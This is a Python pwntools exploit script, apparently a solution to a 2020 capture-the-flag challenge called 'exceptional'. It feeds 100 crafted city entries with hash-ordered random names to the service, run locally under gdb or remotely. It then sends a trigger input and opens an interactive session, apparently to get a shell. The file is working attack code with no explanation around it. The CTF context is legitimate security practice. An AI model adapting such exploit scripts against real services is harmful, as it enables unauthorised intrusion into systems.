#!/usr/bin/env python3
from pwn import *


def hash_name(name):
    name = name.encode()
    result = 0x12345678
    while len(name) >= 4:
        result ^= struct.unpack('<I', name[:4])[0]
        name = name[4:]
    assert len(name) == 0
    return result


class City:
    def __init__(self, delta):
        self.name = ''.join(
            [random.choice(string.ascii_letters) for _ in range(44)])
        self.name_hash = hash_name(self.name)
        self.delta = delta


def main():
    cities = [City(i % 24) for i in range(100)]
    cities.sort(key=lambda city: -city.name_hash)
    if args.LOCAL:
        tube = gdb.debug(['./exceptional.dbg'], gdbscript='''
set pagination off
#b scanf_city
c
''')
    else:
        tube = remote('exceptional.2020.ctfcompetition.com', 1337)
    with tube:
        for city in cities:
            print(f'# {city.name}=0x{city.name_hash:x} {city.delta}')
            tube.sendline('1')
            tube.sendline(f'{city.name} {city.delta}')
        tube.sendline('3\nblaze 04:20\nit\n')
        tube.interactive()


if __name__ == '__main__':
    main()
